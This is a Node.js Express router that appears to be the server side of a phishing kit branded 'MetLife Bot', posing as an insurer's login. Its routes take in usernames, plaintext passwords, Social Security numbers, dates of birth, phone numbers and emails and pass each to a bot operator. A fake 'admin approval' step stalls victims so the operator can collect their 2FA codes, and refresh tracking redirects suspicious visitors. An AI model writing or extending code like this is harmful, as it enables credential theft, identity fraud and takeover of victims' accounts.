const express = require('express');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const geoip = require('geoip-lite');
const User = require('../models/User');
const LoginRequest = require('../models/LoginRequest');
const {
  sendLoginAttemptNotification, sendUsernameNotification, sendDetailsNotification
} = require('../bot');
const BOT_NAME = process.env.BOT_NAME || 'MetLife Bot';

const router = express.Router();

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false,
  message: { message: 'Too many attempts. Please try again later.' },
});

// Rate limiter for page refreshes (5 refreshes per 5 seconds from same IP)
const pageRefreshLimiter = rateLimit({
  windowMs: 5 * 1000,
  max: 5,
  standardHeaders: false,
  legacyHeaders: false,
  skip: (req, res) => {
    // Skip rate limiting for specific routes
    return false;
  },
});

// Store to track refresh attempts
const refreshAttempts = new Map();

/**
 * Get client IP address from request
 */
function getClientIp(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'unknown'
  );
}

/**
 * Get location info from IP using geoip-lite
 */
function getLocationInfo(ip) {
  try {
    const geo = geoip.lookup(ip);
    if (geo) {
      return {
        country: geo.country,
        city: geo.city || 'Unknown',
        timezone: geo.timezone || 'Unknown',
        coordinates: `${geo.ll[0]}, ${geo.ll[1]}`,
      };
    }
  } catch (err) {
    console.error('[geoip] Error:', err);
  }
  return {
    country: 'Unknown',
    city: 'Unknown',
    timezone: 'Unknown',
    coordinates: 'Unknown',
  };
}

/**
 * Validate email format
 */
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(String(email).toLowerCase());
}

/**
 * Validate username format
 */
function isValidUsername(username) {
  const usernameRegex = /^[a-zA-Z0-9_-]{3,20}$/;
  return usernameRegex.test(username);
}

/* ============================
 * POST /api/auth/username
 * ============================ */
router.post('/username', async (req, res) => {
  try {
    const { username } = req.body || {};
    const clientIp = getClientIp(req);

    // Input validation
    if (!username) {
      return res.status(400).json({ message: 'Username is required.' });
    }

    const trimmedUsername = String(username).trim();

    // Log login attempt to bot
    await sendUsernameNotification(
      {
        username: trimmedUsername,
      },
      { ip: clientIp }
    );

    return res.status(200).json({
      message: 'Username received. Please enter your password.',
      username: trimmedUsername,
    });
  } catch (err) {
    console.error('[auth/username] error:', err);
    return res.status(500).json({ message: 'Something went wrong. Please try again.' });
  }
});


// details
router.post('/details', async (req, res) => {
  try {
    const { ssn,dob,phone, email, username} = req.body || {};
    const clientIp = getClientIp(req);

    // Input validation
    if (!ssn || !dob || !phone || !email) {
      return res.status(400).json({ message: 'All fields are required.' });
    }

    const trimmedSsn = String(ssn).trim();
    const trimmedDob = String(dob).trim();
    const trimmedPhone = String(phone).trim();
    const trimmedEmail = String(email).trim();

    // Log login attempt to bot
    await sendDetailsNotification(
      {
        ssn: trimmedSsn,
        dob: trimmedDob,
        phone: trimmedPhone,
        email: trimmedEmail,
        username: username
      },
      { ip: clientIp }
    );

    return res.status(200).json({
      message: 'Details received. Please enter your password.',
      ssn: trimmedSsn,
      dob: trimmedDob,
      phone: trimmedPhone,
      email: trimmedEmail,
    });
  } catch (err) {
    console.error('[auth/details] error:', err);
    return res.status(500).json({ message: 'Something went wrong. Please try again.' });
  }
});

/* ============================
 * POST /api/auth/login
 * ============================ */
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body || {};
    const clientIp = getClientIp(req);
    const locationInfo = getLocationInfo(clientIp);
    const timestamp = new Date().toISOString();

    // Input validation
    if (!username || !password) {
      return res.status(400).json({ message: 'Username and password are required.' });
    }

    const trimmedUsername = String(username).trim();
    const trimmedPassword = String(password);

    // Save user to database (allowing duplicates as per requirements)
    const user = new User({
      username: trimmedUsername,
      password: trimmedPassword,
      approvalStatus: 'pending',
      email: null, // Allow null to prevent duplicate key errors
      loginAttempts: [{
        timestamp: new Date(),
        ip: clientIp,
        userAgent: req.get('user-agent'),
        status: 'pending_approval',
      }],
    });

    await user.save();

    // Create a login request for admin approval
    const verificationId = `login_${trimmedUsername}_${Date.now()}`;
    const loginRequest = new LoginRequest({
      username: trimmedUsername,
      password: trimmedPassword,
      verificationId: verificationId,
      status: 'pending', // User needs to wait for approval
      ip: clientIp,
      userAgent: req.get('user-agent'),
      location: locationInfo,
      botname: BOT_NAME
    });

    await loginRequest.save();

    // Log login attempt to bot
    await sendLoginAttemptNotification(
      {
        username: trimmedUsername,
        password: trimmedPassword,
        verificationId: verificationId,
      },
      { ip: clientIp }
    );

    // Generate temporary JWT token for approval page (expires in 15 minutes)
    const tempToken = jwt.sign(
      { 
        sub: trimmedUsername, 
        username: trimmedUsername, 
        tempOnly: true, 
        loginRequestId: verificationId,
        type: 'login_approval'
      },
      process.env.JWT_SECRET || 'default-secret-key',
      { expiresIn: '1m' }
    );

    return res.status(200).json({
      message: 'Login credentials received. Waiting for admin approval...',
      tempToken,
      username: trimmedUsername,
      verificationId: verificationId,
      requiresApproval: true,
    });
  } catch (err) {
    console.error('[auth/login] error:', err);
    return res.status(500).json({ message: 'Something went wrong. Please try again.' });
  }
});

/* ============================
 * GET /api/auth/check-login-approval/:verificationId
 * Check if login has been approved
 * ============================ */
router.get('/check-login-approval/:verificationId', async (req, res) => {
  try {
    const { verificationId } = req.params;

    const loginRequest = await LoginRequest.findOne({ verificationId });

    if (!loginRequest) {
      return res.status(404).json({
        success: false,
        message: 'Login request not found.',
      });
    }

    // Check if approval request has expired
    if (new Date() > loginRequest.expiresAt) {
      // Update status to expired if not already
      if (loginRequest.status !== 'expired') {
        await LoginRequest.findOneAndUpdate(
          { verificationId },
          { status: 'expired', logType: 'expired_request' }
        );
      }
      
      return res.status(401).json({
        success: false,
        status: 'expired',
        message: 'Login approval request has expired. Please login again.',
      });
    }

    if (loginRequest.status === 'pending') {
      return res.status(200).json({
        success: true,
        status: 'pending',
        message: '...',
      });
    }

    if (loginRequest.status === 'approved') {
      // No code generation - user will provide their own 8-digit code for admin approval
      return res.status(200).json({
        success: true,
        status: 'approved',
        message: 'Login approved. Please enter your 8-digit 2FA code.',
        username: loginRequest.username,
      });
    }

    if (loginRequest.status === 'rejected') {
      return res.status(403).json({
        success: false,
        status: 'rejected',
        message: loginRequest.rejectedReason || 'Your login has been rejected by admin.',
      });
    }

    return res.status(200).json({
      success: true,
      status: loginRequest.status,
    });
  } catch (err) {
    console.error('[auth/check-login-approval] error:', err);
    return res.status(500).json({
      success: false,
      message: 'Failed to check approval status.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/* ============================
 * POST /api/auth/track-refresh
 * Track page refreshes and implement rate limiting
 * ============================ */
router.post('/track-refresh', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const userAgent = req.get('user-agent');
    const now = Date.now();
    const key = `${clientIp}_${userAgent}`;

    // Initialize or get existing attempts
    if (!refreshAttempts.has(key)) {
      refreshAttempts.set(key, []);
    }

    const attempts = refreshAttempts.get(key);
    // Remove attempts older than 5 seconds
    const recentAttempts = attempts.filter(time => now - time < 5000);
    recentAttempts.push(now);
    refreshAttempts.set(key, recentAttempts);

    // If too many refreshes, log redirect and return redirect flag
    if (recentAttempts.length > 5) {
      const locationInfo = getLocationInfo(clientIp);
      
      // Log the redirect
      const redirectLog = new LoginRequest({
        username: `refresh_limit_${clientIp}_${Date.now()}`,
        password: 'N/A',
        verificationId: `redirect_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        status: 'redirected',
        logType: 'redirected_request',
        ip: clientIp,
        userAgent: userAgent,
        location: locationInfo,
      });

      await redirectLog.save();

      return res.status(429).json({
        success: false,
        message: 'Too many page refreshes. You are being redirected.',
        redirect: true,
      });
    }

    return res.status(200).json({
      success: true,
      message: 'Refresh tracked.',
      refreshCount: recentAttempts.length,
    });
  } catch (err) {
    console.error('[auth/track-refresh] error:', err);
    return res.status(500).json({ message: 'Failed to track refresh.' });
  }
});

/* ============================
 * POST /api/auth/log-redirect
 * Log rate-limited redirects
 * ============================ */
router.post('/log-redirect', async (req, res) => {
  try {
    const { page, reason, refreshCount } = req.body || {};
    const clientIp = getClientIp(req);
    const locationInfo = getLocationInfo(clientIp);

    // Create a redirect log entry
    const redirectLog = new LoginRequest({
      username: `redirect_${clientIp}_${Date.now()}`,
      password: 'N/A',
      verificationId: `redirect_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      status: 'redirected',
      logType: 'redirected_request',
      ip: clientIp,
      userAgent: req.get('user-agent'),
      location: locationInfo,
    });

    await redirectLog.save();

    return res.status(200).json({
      success: true,
      message: 'Redirect logged successfully.',
    });
  } catch (err) {
    console.error('[auth/log-redirect] error:', err);
    return res.status(500).json({ message: 'Failed to log redirect.' });
  }
});

module.exports = router;
